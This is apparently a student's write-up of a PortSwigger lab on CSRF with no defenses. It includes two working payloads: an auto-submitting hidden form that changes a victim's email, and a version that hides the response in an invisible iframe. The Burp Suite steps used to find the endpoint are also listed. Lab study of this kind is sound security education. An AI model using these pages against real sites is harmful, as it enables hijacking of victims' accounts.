# CSRF vulnerability with no defenses

## Scenario
- Victim is currently logged into the vulnerable site
- Attacker sends malicious link to user \
NOTE: This is simulated via the exploit server in portswigger
- User clicks on the link
- The POST request is sent on behalf of the attacker
```
<html>
  <body>
    <form action="https://vulnerable-website.com/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Attackology via BurpSuite Community edition and Expxloit server
1. Logged in as the user given in the lab
2. Pulled BurpSuite to intercept the traffic during the email change process
3. Deliberately changed the email of the account to determine the endpoint and method of the vulnerable email change functionality

4. In BurpSuite, looked at the HTTP history to look fo the email change endpoint and sent it to repeater

5. Went to the exploit server given in the lab and added the endpoint to the form 
6. ```document.forms[0].submit``` automatically sends the POST request to the vulnerable site

7. Send the payload to the victim

8. Make the email was changed after sending the payload

## Attacklogy via python simple server hosting a html page
1. Logged in as user in the lab
2. Create the html page with following code:
```html
<html>
    <body>
        <h1>Hello World!</h1>    
        <!--
            iframe => An inline frame is used to embed another document within the current HTML document
            The iframe with STYLE="DISPLAY:NONE" ensures that the victim does not recognize the page being redirected

            Reference:
            HTML Iframes  
            https://www.w3schools.com/html/html_iframe.asp
         -->
        <iframe style="display:none" name="csrf-iframe"></iframe>
        <!--
            Target attribute specifies a name or a keyword that indicates where to display the response that is received after submitting the form
            In this example,  the value of the target displays the response to a iframe
            Reference:
            HTML <form> target Attribute 
            https://www.w3schools.com/TAGs/att_form_target.asp
        -->
        <form action="https://acb01f961f46be3ec0d009ff00960036.web-security-academy.net/my-account/change-email" method="POST" target="csrf-iframe" id="csrf-form">
            <input type="hidden" name="email" value="pcap_panwed_you_one_more_tme@pcap.com">
        </form>
        <script>document.getElementById("csrf-form").submit()</script>
    </body>
</html>
```
